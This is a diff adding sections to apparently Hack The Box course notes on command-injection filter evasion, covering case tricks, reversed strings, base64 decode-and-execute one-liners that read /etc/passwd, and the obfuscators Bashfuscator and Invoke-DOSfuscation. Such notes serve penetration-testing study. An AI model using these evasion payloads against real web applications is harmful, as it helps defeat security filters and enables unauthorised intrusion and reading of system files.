@@ -657,3 +657,231 @@ Command:
     - RCE
     - Filter-based WAF rules
 
+## Advanced Command Obfuscation 
+
+**Goal**  
+Bypass advanced filters/WAFs that block direct command strings or simple evasion by making injected commands harder to detect while preserving execution.
+
+### Case Manipulation
+
+#### Windows (CMD/PowerShell)
+
+- Commands are **case-insensitive**.
+
+`WhOaMi`
+
+✔ Executes `whoami`
+
+#### Linux (bash is case-sensitive)
+
+- Convert mixed case to lowercase at runtime.
+
+**Using `tr`:**
+
+`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
+
+**Constraint**
+
+- Spaces may be filtered → replace with tabs (`%09`) or other space bypasses.
+
+**Alternative (parameter expansion):**
+
+`$(a="WhOaMi";printf %s "${a,,}")`
+
+### Reversed Commands
+
+**Idea**
+
+- Avoid blacklisted keywords by reversing strings and reversing them back during execution.
+
+#### Linux
+
+`$(rev<<<'imaohw')`
+
+#### Windows (PowerShell)
+
+`iex "$('imaohw'[-1..-20] -join '')"`
+
+**Note**
+
+- If characters are filtered, reverse them as well or include them in the reversed payload.
+
+### Encoded Commands
+
+**Purpose**
+
+- Avoid filtered characters or URL-decoding issues.
+- Create unique payloads unlikely to match WAF signatures.
+
+#### Linux — Base64
+
+**Encode payload:**
+
+`echo -n 'cat /etc/passwd | grep 33' | base64`
+
+**Decode + execute (no pipe):**
+
+`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
+
+- Uses `<<<` to avoid `|` (filtered).
+- Alternatives if filtered:
+    
+    - `sh` instead of `bash`
+    - `openssl` instead of `base64`
+    - `xxd` for hex decoding
+    
+#### Windows — Base64 (UTF-16LE)
+
+**Encode:**
+
+`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
+
+**Decode + execute:**
+
+`iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
+
+### Key Points
+
+- Advanced obfuscation reduces detection likelihood.
+- Always adapt to:
+    
+    - Filtered characters
+    - Blocked commands
+    - Encoding/decoding constraints
+    
+- Techniques can be combined:
+    
+    - Case + reversal
+    - Encoding + character bypass
+        
+- Many other methods exist:
+    
+    - Wildcards
+    - Regex
+    - Redirection
+    - Integer expansion
+
+## Evasion Tools 
+
+When manual obfuscation fails against **advanced filters or WAFs**, automated evasion tools can generate payloads that are far harder to detect. Below are two commonly used tools: one for **Linux (Bash)** and one for **Windows (CMD/PowerShell)**.
+
+### Linux: Bashfuscator
+
+**Purpose**
+
+- Automatically obfuscates Bash commands using multiple techniques:
+    
+    - Tokenization
+    - String reordering
+    - Variable expansion
+    - Runtime reconstruction
+        
+- Output often does **not resemble the original command at all**.
+
+#### Installation
+
+`git clone https://github.com/Bashfuscator/Bashfuscator cd Bashfuscator pip3 install setuptools==65 python3 setup.py install --user`
+
+#### Basic Usage
+
+`cd ./bashfuscator/bin/ ./bashfuscator -c 'cat /etc/passwd'`
+
+⚠️ Default mode is **random and heavy**:
+
+- Payload size can be **hundreds of KBs to MBs**
+- Often blocked due to length or forbidden characters
+
+
+#### Controlled / Short Payload Generation
+
+`./bashfuscator -c 'cat /etc/passwd' \   -s 1 -t 1 --no-mangling --layers 1`
+
+**What these flags do**
+
+- `-s 1` → one string obfuscator
+- `-t 1` → one token obfuscator
+- `--no-mangling` → avoids excessive transformations
+- `--layers 1` → single obfuscation layer
+    
+
+✔ Produces **shorter, cleaner payloads** (≈100 chars)
+
+#### Testing the Output
+
+`bash -c 'OBFUSCATED_PAYLOAD'`
+
+If it works locally but fails in a web app, common reasons are:
+
+- Spaces not bypassed (replace with `%09`, `${IFS}`, etc.)
+- Use of filtered characters (`/`, `|`, `>`, etc.)
+- Payload length restrictions
+
+ Re-run Bashfuscator with different settings until constraints are satisfied.
+### Windows: Invoke-DOSfuscation
+
+**Purpose**
+
+- Interactive PowerShell tool for obfuscating:
+    
+    - CMD commands
+    - PowerShell payloads
+        
+- Uses:
+    
+    - Environment variable slicing
+    - Encoding tricks
+    - Character reconstruction
+        
+#### Installation & Launch
+
+`git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git cd Invoke-DOSfuscation Import-Module .\Invoke-DOSfuscation.psd1 Invoke-DOSfuscation`
+
+#### Interactive Workflow Example
+
+`Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt Invoke-DOSfuscation> encoding Invoke-DOSfuscation\Encoding> 1`
+
+**Generated payload example**
+
+`typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h...`
+
+✔ Executes normally in `cmd.exe`  
+✔ Does **not contain the original command string**
+
+#### Execution Test
+
+`C:\> typ%TEMP:~-3,-2% ...`
+
+---
+
+## Cross-Platform Tip
+
+- You can run **Invoke-DOSfuscation on Linux** using PowerShell:
+    
+
+`pwsh`
+
+(It’s preinstalled in **HTB Pwnbox**)
+
+---
+
+## Key Takeaways
+
+- **Automated obfuscators** are best against:
+    
+    - Regex-based filters
+        
+    - Static blacklists
+        
+    - Signature-based WAF rules
+        
+- Always tune output for:
+    
+    - Length limits
+        
+    - Blocked characters
+        
+    - Allowed encodings
+        
+- Obfuscation ≠ exploitation
+    
+    - You still need a valid injection point
